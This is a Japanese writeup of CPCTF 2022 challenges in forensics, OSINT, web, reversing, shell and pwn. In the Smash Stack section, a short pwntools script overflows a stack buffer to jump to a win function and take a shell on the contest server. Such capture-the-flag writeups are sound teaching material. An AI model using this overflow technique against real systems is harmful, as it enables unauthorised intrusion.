# CPCTF 2022 Writeup

## 目次

- Forensics
  - [sunset](#sunset)
  - [Dive!](#dive)
  - [deeper](#deeper)
- Misc
  - [Eagle](#eagle)
- OSINT
  - [Welcome to OSINT! 1](#welcome-to-osint-1)
- Web
  - [POST!ME!](#postme)
  - [Robots](#robots)
- Pwn
  - [Smash Stack](#smash-stack)
- Rev
  - [Welcome to reversing](#welcome-to-reversing)
- Shell
  - [Find Image](#find-image)

## sunset

画像ファイルだけあります。とりあえず`exiftool flag.jpg`でEXIF情報を確認するとCommentの欄にフラグがありました。

## Dive!

Docker Imageがあるので問題文にあるように素直に`docker load -i image.tar`してもよいですが、Docker環境を用意していなくて使いたくなかったので`tar xvf image.tar`してから`grep -ril CPCTF`でディレクトリ以下のファイル内に"CPCTF"という文字列を含むファイル名を見つけます。いくつか見つかるので確認するとフラグが手に入ります。

## deeper

ファイルがひとつだけあります。`file flag`で確認するとPNGファイルであることが分かります。画像をピクセル単位で確認しても特に怪しいところはありません。`binwalk -D='.*' flag`をしてみると中にzipファイルが入っていました。zip、gzip、bzip2と解凍するとBase64エンコードされたテキストファイルが出てきます。`cat flag | base64 -d > flag2`という感じでファイルに出力するとzipファイルだったので解凍するとSVGファイルが出てきます。なんか文字が隠されていますが文字列をコピーしてフラグゲット。

## Eagle

zipファイルがあるので解凍してみると特徴的な拡張子のファイルがいくつかあります。拡張子で検索にかけてみると、どうやらEagleとはフリーの基板開発CADソフトウェアらしいということが分かります。フリーなのでEagleをインストールしてもよいですが、面倒なのでオンラインでガーバーファイルを表示できる[Online Gerber Viewer](https://www.gerber-viewer.com/)というものを使って見てみるとフラグがありました。

## Welcome to OSINT! 1

Googleレンズを使うと俺流塩ラーメンっぽいというところまでは分かりますがフラグ形式に当てはめることができるような情報はないです。Google画像検索で検索してみると一致した画像を含むページとしてブログが見つかります。開くとフラグが書いてありました。

## POST!ME!

ソースコードを見てみるとPOSTメソッドを投げるとフラグの前半、DLETEメソッドで後半が得られるようです。curlを使い`curl -X POST https://postme.cpctf.space/ -d '{"password":"pass"}' -H 'Content-Type:application/json'`、`curl -X DELETE https://postme.cpctf.space/`を投げると貰えます。注意点として、HeaderでJSONを正しく指定しないと400が返されてフラグが貰えません。

## Robots

まずrobots.txtとは検索エンジンのクローラにどのURLにアクセスしてよいかを示すものです。`https://chocolatechipcookie.cpctf.space/robots.txt`にアクセスするとフラグがあるURLが書かれており、そこにアクセスするとフラグがあります。

## Smash Stack

retaddrを書き換えてwin関数に飛ばす簡単なBOFを使ったROPです。最初頭が悪くて手元で`gcc vuln.c -o vuln`したセキュリティ機構全装備の実行ファイルを使って上手くいかないなと時間を溶かしまくっていました。サーバーにあるものはセキュリティ機構が外されており、素直にwinに飛ばしてシェルを奪うことができるのでflagが確認できます。

```py
from pwn import *

io = process(['nc', "smash-stack.cpctf.space", "30005"])
io.recvuntil("win: ")
win = io.recvuntil("\n").decode()[:-1]
print(win)
win_addr = eval(f"p64({win})")

buf_size = 32
payload = b"\x00" * (buf_size + 8) + win_addr
io.sendline(payload)

io.interactive()
```

## Welcome to reversing

問題文にあるようにGhidraで見てみます。

```c
  if (((((local_26 == 'C') && (local_1b == 'n')) && (local_28 == 'C')) &&
      (((local_1e == 'r' && (local_24 == 'F')) &&
       ((local_19 == '}' && ((local_22 == 'r' && (local_1c == '1')))))))) &&
     ((local_20 == 'v' &&
      (((((local_1f == '3' && (local_25 == 'T')) && (local_1a == '6')) &&
        ((local_21 == '3' && (local_27 == 'P')))) && ((local_1d == '5' && (local_23 == '{')))))))) {
    puts("Correct!");
```

のようなコードがあるので順に並べるとフラグが手に入ります。

## Find Image

```sh
mkdir image_mnt
sudo mount -t ext4 -o loop image.img ./image_mnt/
```

でマウントします。`新しいフォルダー - コピー (2) - コピー - コピー`のような地獄のようなディレクトリが大量にあるのでとりあえず`tree`すると、`/image_mnt/新しいフォルダー - コピー (4) - コピー/新しいフォルダー (2) - コピー/flag.png`にフラグらしきものがあります。画像を開くとフラグが書いてあります。